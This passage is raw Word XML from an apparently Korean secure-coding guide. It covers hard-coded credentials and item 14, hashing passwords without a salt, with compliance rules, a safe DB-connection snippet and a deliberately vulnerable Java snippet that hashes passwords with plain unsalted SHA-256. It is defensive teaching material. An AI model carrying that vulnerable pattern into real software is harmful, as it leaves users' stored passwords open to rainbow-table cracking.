              <w:t>정보가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>운영</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>서버에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>남아있을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>경우</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> DB </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>직접</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>접근</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>관리</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>콘솔</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>로그인</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>내부망</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>침투가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>즉시</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>가능합니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFDA"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>주석에는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>기능</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>설명만</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>포함</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>인증</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>정보</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>없음</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">// </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>사용자</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>정보</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> DB </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>연결</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>접속</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>정보는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> application.properties </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>참조</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>Connection con = getConnection();</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E"/>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">  14. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>솔트</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>없이</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>일방향</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>해시함수</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>사용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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>준수사항</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>패스워드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저장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시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패스워드와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솔트</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>(Salt)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>를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함께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해시함수에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입력하여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얻은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해시값을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저장한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>솔트는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사용자마다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고유하게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생성하고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해시값과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함께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저장한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FCE4D6"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>솔트</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>없이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>단순</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> SHA-256 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>해시</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>MessageDigest md = MessageDigest.getInstance("SHA-256");</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>byte[] hash = md.digest(password.getBytes());</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">// </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>레인보우</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>테이블</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>공격으로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>역산</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>가능</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B1872">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="002B1872" w:rsidRDefault="00913677">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>위험</w:t>
            </w:r>
            <w:r>
